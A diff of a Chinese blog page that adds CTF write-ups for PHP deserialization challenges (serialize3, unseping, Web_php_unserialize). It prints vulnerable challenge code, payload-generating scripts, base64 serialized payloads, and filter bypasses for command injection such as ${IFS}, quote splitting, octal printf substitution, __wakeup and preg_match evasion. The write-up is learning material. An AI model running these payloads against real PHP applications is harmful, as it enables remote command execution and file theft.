@@ -16,18 +16,24 @@
   <meta name="author" content="Zheng Yi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="serialize3攻防世界这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111  进行攻击载荷构造 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}将变量个数1改为2可以绕过wakeup函数  成功攻击">
+    <meta name="description" content="serialize3攻防世界这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111  进行攻击载荷构造 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}将变量个数1改为2可以绕过wakeup函数  成功攻击 unseping攻防世界直接上源码1234567891011121314151617181920212223242526272829303">
 <meta property="og:type" content="article">
-<meta property="og:title" content="serialize3攻防世界">
+<meta property="og:title" content="serialize攻防世界">
 <meta property="og:url" content="http://example.com/2023/05/17/serialize%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/index.html">
 <meta property="og:site_name" content="ZizZy&#39;s blog">
-<meta property="og:description" content="serialize3攻防世界这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111  进行攻击载荷构造 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}将变量个数1改为2可以绕过wakeup函数  成功攻击">
+<meta property="og:description" content="serialize3攻防世界这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111  进行攻击载荷构造 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}将变量个数1改为2可以绕过wakeup函数  成功攻击 unseping攻防世界直接上源码1234567891011121314151617181920212223242526272829303">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize31.png">
 <meta property="og:image" content="http://example.com/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize32.png">
 <meta property="og:image" content="http://example.com/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize33.png">
+<meta property="og:image" content="http://example.com/img/unseping1.png">
+<meta property="og:image" content="http://example.com/img/unseping2.png">
+<meta property="og:image" content="http://example.com/img/unsping3.png">
+<meta property="og:image" content="http://example.com/img/unsping5.jpg">
+<meta property="og:image" content="http://example.com/img/unsping4.png">
+<meta property="og:image" content="http://example.com/img/Web_php_unserialize1.png">
 <meta property="article:published_time" content="2023-05-17T12:21:32.000Z">
-<meta property="article:modified_time" content="2023-05-17T13:04:04.877Z">
+<meta property="article:modified_time" content="2023-05-20T01:10:54.800Z">
 <meta property="article:author" content="Zheng Yi">
 <meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary_large_image">
@@ -35,7 +41,7 @@
   
   
   
-  <title>serialize3攻防世界 - ZizZy&#39;s blog</title>
+  <title>serialize攻防世界 - ZizZy&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +207,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="serialize3攻防世界"></span>
+            <span id="subtitle" data-typed-text="serialize攻防世界"></span>
           
         </div>
 
@@ -224,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          125 字
+          5.8k 字
         
       </span>
     
@@ -235,7 +241,7 @@
         
         
         
-          2 分钟
+          49 分钟
         
       </span>
     
@@ -273,16 +279,69 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">serialize3攻防世界</h1>
+            <h1 style="display: none">serialize攻防世界</h1>
             
             
               <div class="markdown-body">
                 
-                <h4 id="serialize3攻防世界"><a href="#serialize3攻防世界" class="headerlink" title="serialize3攻防世界"></a><strong>serialize3攻防世界</strong></h4><p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize31.png" srcset="/img/loading.gif" lazyload><br>这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111</p>
+                <h1 id="serialize3攻防世界"><a href="#serialize3攻防世界" class="headerlink" title="serialize3攻防世界"></a><strong>serialize3攻防世界</strong></h1><p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize31.png" srcset="/img/loading.gif" lazyload><br>这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111</p>
 <p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize32.png" srcset="/img/loading.gif" lazyload></p>
 <p>进行攻击载荷构造 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br>将变量个数1改为2可以绕过wakeup函数</p>
 <p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize33.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功攻击</p>
+<h1 id="unseping攻防世界"><a href="#unseping攻防世界" class="headerlink" title="unseping攻防世界"></a><strong>unseping攻防世界</strong></h1><h3 id="直接上源码"><a href="#直接上源码" class="headerlink" title="直接上源码"></a>直接上源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<span class="hljs-comment">//在$this-&gt;method里面找ping这个值</span><br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<span class="hljs-comment">//调用ping函数 $this-&gt;method是要执行的命令</span><br>        &#125;<br>    &#125; <br> <span class="hljs-comment">/*可以看看chatgpt的分析</span><br><span class="hljs-comment">在这个特定的 __destruct() 方法中，有一个条件语句。它检查 $this-&gt;method 是否在一个包含字符串 &quot;ping&quot; 的数组中（array(&quot;ping&quot;)）。如果 $this-&gt;method 是 &quot;ping&quot;，则执行 call_user_func_array() 函数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">call_user_func_array() 函数用于调用一个回调函数，并传递一个参数数组。在这个例子中，回调函数是 $this-&gt;method 所代表的方法，并且参数数组是 $this-&gt;args。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">简而言之，当一个对象被销毁时，如果 $this-&gt;method 的值是 &quot;ping&quot;，则会调用相应的方法，并传递 $this-&gt;args 作为参数*/</span><br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<span class="hljs-comment">//exec函数用来执行系统命令</span><br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<span class="hljs-comment">//过滤这里要进行绕过</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//传值 不懂可以参考下https://www.php.cn/php-ask-491652.html</span><br>        &#125;<br>    &#125;   <br>&#125;<br><br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="简单分析后开始构造payload"><a href="#简单分析后开始构造payload" class="headerlink" title="简单分析后开始构造payload"></a>简单分析后开始构造payload</h3><p>我们可以通过wat()和ping()得到提示应该是执行系统命令，该系统是linux</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;&#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br>    <span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>得到payload ：O:4:”ease”:2:{s:12:”easemethod”;s:4:”ping”;s:10:”easeargs”;a:1:{i:0;s:2:”ls”;}}<br>base64编码后为：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyOiJscyI7fX0&#x3D;<br>查看返回值<br><img src="/img/unseping1.png" srcset="/img/loading.gif" lazyload><br>这说明ls被过滤了</p>
+<h3 id="二次构造payload-用空环境变量绕过"><a href="#二次构造payload-用空环境变量绕过" class="headerlink" title="二次构造payload 用空环境变量绕过"></a>二次构造payload 用空环境变量绕过</h3><p>使用空环境变量绕过<br>1.”“双引号<br>2.‘’单引号（在这里不行）<br>3’${Z}<br>二次构造ls之间增加””即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>post提交base64编码Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsIiJzIjt9fQ&#x3D;&#x3D;<img src="/img/unseping2.png" srcset="/img/loading.gif" lazyload><br>发现flag_1s_here文件</p>
+<h3 id="三次构造payload"><a href="#三次构造payload" class="headerlink" title="三次构造payload"></a>三次构造payload</h3><p>这里我们需要执行的命令是ls flag_1s_here<br>这个空应该使用什么绕过呢参考其他师傅的题解了解到，${IFS}可以用来替代空格</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s$&#123;IFS&#125;fl&quot;&quot;ag_1s_here&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>post提交base64编码<br>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyNDoibCIicyR7SUZTfWZsIiJhZ18xc19oZXJlIjt9fQ&#x3D;&#x3D;<br><img src="/img/unsping3.png" srcset="/img/loading.gif" lazyload><br>发现文件flag_831b69012c67b35f.php</p>
+<h3 id="四次构造payload-OTC命令执行"><a href="#四次构造payload-OTC命令执行" class="headerlink" title="四次构造payload OTC命令执行"></a>四次构造payload OTC命令执行</h3><p>这里需要我们继续构造payload查看文件，正常来说我们的命令是<br>cat flag_1s_here&#x2F;flag_831b69012c67b35f.php<br>cd flag_1s_here;cat flag_831b69012c67b35f.php<br>cd flag_1s_here&amp;&amp;cat flag_831b69012c67b35f.php<br>但是发现都有字符被过滤且不好绕过<br>这里参考师傅们的web发现需要编写脚本对命令进行八进制转换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 字符串转8进制</span><br>str_1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要转换的字符串:&quot;</span>)<br>str_8 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_1:<br>    str_8 += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(s))).replace(<span class="hljs-string">&quot;0o&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br><span class="hljs-built_in">print</span>(str_8)<br><br><br></code></pre></td></tr></table></figure>
+
+<p>结果为\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160<br>执行的方法为<br><img src="/img/unsping5.jpg" srcset="/img/loading.gif" lazyload><br>再执行php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>&#125;<br>  <br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>得到payload并且post提交<br>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319<br>得到最终flag<br><img src="/img/unsping4.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Web-php-unserialize攻防世界"><a href="#Web-php-unserialize攻防世界" class="headerlink" title="Web_php_unserialize攻防世界"></a><strong>Web_php_unserialize攻防世界</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//反序列化后执行</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <span class="hljs-comment">//GET获取值</span><br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <span class="hljs-comment">//base64解码</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <span class="hljs-comment">//preg_match匹配字符</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="preg-match-正则匹配绕过"><a href="#preg-match-正则匹配绕过" class="headerlink" title="preg_match()正则匹配绕过"></a>preg_match()正则匹配绕过</h3><p>&#x2F;[oc]:\d+:&#x2F;i研究：</p>
+<ul>
+<li><p><code>/</code>：用于界定正则表达式模式的分隔符。</p>
+</li>
+<li><p><code>[oc]</code>：字符类，匹配字符’o’或’c’。</p>
+</li>
+<li><p><code>:</code>：匹配一个冒号字符。</p>
+</li>
+<li><p><code>\d+</code>：匹配一个或多个数字。</p>
+</li>
+<li><p><code>:</code>：匹配一个冒号字符。</p>
+</li>
+<li><p><code>/i</code>：标志，使模式匹配时不区分大小写。</p>
+<p>总结起来，这个正则表达式将匹配满足以下模式的字符串：</p>
+</li>
+<li><p>以字母’o’或’c’开头，后跟一个冒号。</p>
+</li>
+<li><p>然后是一个或多个数字。</p>
+</li>
+<li><p>最后是一个冒号。</p>
+</li>
+</ul>
+<p>在PHP中，<code>preg_match()</code>函数用于对给定的字符串进行正则表达式匹配。如果匹配成功，该函数将返回1，否则返回0。</p>
+<p><strong>类序列化后的值O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong><br>我们需要进行构造在4前面加上一个+即可，这样也可以表示数字4<br><strong>O:+4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong></p>
+<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>将变量数量由1改为2即可<br><strong>O:+4:”Demo”:2:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong></p>
+<h3 id="修改payload"><a href="#修改payload" class="headerlink" title="修改payload"></a>修改payload</h3><p>修改payload有两种方式<br>1.直接修改（不推荐，总是容易出现错误）<br>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}<br>修改后O:+4:”Demo”:2:{s:10:”%00Demo%00file”;s:8:”fl4g.php”;}</p>
+<p>2.利用函数修改</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>,<span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Web_php_unserialize1.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -335,7 +394,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>serialize3攻防世界</div>
+      <div>serialize攻防世界</div>
       <div>http://example.com/2023/05/17/serialize攻防世界/</div>
     </div>
     <div class="license-meta">
@@ -380,9 +439,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/05/18/unseping%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" title="unseping攻防世界">
+                      <a href="/2023/05/21/php%E8%BF%90%E7%AE%97%E7%AC%A6%E5%8F%B7/" title="php运算符号">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">unseping攻防世界</span>
+                        <span class="hidden-mobile">php运算符号</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
